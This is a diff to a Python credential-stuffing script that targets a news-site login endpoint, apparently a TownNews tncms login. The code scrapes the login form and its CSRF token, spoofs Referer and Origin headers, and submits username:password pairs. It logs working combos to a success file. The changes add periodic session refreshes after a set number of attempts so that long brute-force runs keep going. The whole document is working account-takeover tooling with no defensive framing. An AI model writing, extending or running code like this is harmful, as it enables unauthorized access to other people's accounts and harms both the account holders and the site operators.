@@ -13,12 +13,13 @@ from settings import (
     PASSWORD_PARAM_STRING,
     CSRF_PARAM_STRING,
     DELAY_BETWEEN_REQUESTS,
+    MAX_ATTEMPTS_PER_SESSION
 )
 
 
 def create_session() -> Optional[requests.Session]:
     """
-    Create a requests.Session with full headers and verify login page accessibility.
+    Create a requests.Session with default headers and fetch initial cookies.
 
     Returns:
         Optional[requests.Session]: Configured session if reachable, else None.
@@ -26,10 +27,11 @@ def create_session() -> Optional[requests.Session]:
     session = requests.Session()
     session.headers.update(DEFAULT_SESSION_HEADERS)
     try:
-        r = session.get(LOGIN_PAGE_URL, timeout=10)
-        if r.status_code != 200:
-            print(f"[!] Server returned status: {r.status_code}")
+        resp = session.get(LOGIN_PAGE_URL, timeout=10)
+        if resp.status_code != 200:
+            print(f"[!] Server returned status: {resp.status_code}")
             return None
+        session.cookies.update(resp.cookies)
     except requests.RequestException as e:
         print(f"[!] Connection error: {e}")
         return None
@@ -41,13 +43,13 @@ def fetch_login_form(session: requests.Session) -> Tuple[str, Dict[str, str]]:
     Fetch login page and extract form action and input values.
 
     Args:
-        session (requests.Session): Active session.
+        session (requests.Session): Active HTTP session.
 
     Returns:
         Tuple[str, Dict[str, str]]: (post_url, form_values)
     """
-    r = session.get(LOGIN_PAGE_URL, timeout=10)
-    soup = BeautifulSoup(r.text, "html.parser")
+    resp = session.get(LOGIN_PAGE_URL, timeout=10)
+    soup = BeautifulSoup(resp.text, "html.parser")
     form = soup.find("form")
     post_url = urljoin(LOGIN_PAGE_URL, form.get("action")) if form and form.get("action") else LOGIN_POST_URL
     form_values = {inp.get("name"): inp.get("value", "") for inp in form.find_all("input") if inp.get("name")} if form else {}
@@ -72,32 +74,44 @@ def extract_csrf(form_values: Dict[str, str]) -> Optional[str]:
     return None
 
 
-def try_login(session: requests.Session, known_success: Set[str], username: str, password: str) -> bool:
+def try_login(
+    session: requests.Session,
+    known_success: Set[str],
+    username: str,
+    password: str,
+    attempt_counter: int
+) -> Tuple[bool, int]:
     """
-    Attempt login using provided credentials and save successful attempts.
+    Attempt login using provided credentials and refresh session periodically.
 
     Args:
         session (requests.Session): Active HTTP session.
         known_success (Set[str]): Set of previously successful combos.
         username (str): Username to try.
         password (str): Password to try.
+        attempt_counter (int): Current number of attempts on this session.
 
     Returns:
-        bool: True if login succeeded, False otherwise.
+        Tuple[bool, int]: (login_successful, updated_attempt_counter)
     """
-    post_url, form_values = fetch_login_form(session)
+    if attempt_counter >= MAX_ATTEMPTS_PER_SESSION:
+        print("[*] Refreshing session to avoid expiration...")
+        session = create_session()
+        if session is None:
+            print("[!] Failed to refresh session")
+            return False, 0
+        attempt_counter = 0
 
+    post_url, form_values = fetch_login_form(session)
     payload = {
         USERNAME_PARAM_STRING: username,
         PASSWORD_PARAM_STRING: password,
         "redirect": form_values.get("redirect", "/apps/tncms/login.cms")
     }
-
     csrf_val = extract_csrf(form_values)
     if csrf_val:
         payload[CSRF_PARAM_STRING] = csrf_val
 
-    # Ustawienie Referer i Origin
     session.headers.update({
         "Referer": LOGIN_PAGE_URL,
         "Origin": f"https://{LOGIN_PAGE_URL.split('://')[1].split('/')[0]}"
@@ -105,17 +119,18 @@ def try_login(session: requests.Session, known_success: Set[str], username: str,
 
     try:
         resp = session.post(post_url, data=payload, timeout=15)
+        session.cookies.update(resp.cookies)
         time.sleep(DELAY_BETWEEN_REQUESTS)
 
         if resp.status_code != 200:
             print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
-            return False
+            return False, attempt_counter + 1
 
         try:
             response_json = resp.json()
         except ValueError:
             print(f"[!] Non-JSON response for {username}:{password}")
-            return False
+            return False, attempt_counter + 1
 
         if not response_json.get("error"):
             combo = f"{username}:{password}"
@@ -123,11 +138,11 @@ def try_login(session: requests.Session, known_success: Set[str], username: str,
                 save_to_file(SUCCESS_FILE_PATH, combo)
                 known_success.add(combo)
             print(f"[+] Success: {combo}")
-            return True
+            return True, attempt_counter + 1
 
     except requests.RequestException as e:
         print(f"[!] Request error for {username}:{password} -> {e}")
     except Exception as e:
         print(f"[!] Unexpected error for {username}:{password} -> {e}")
 
-    return False
+    return False, attempt_counter + 1
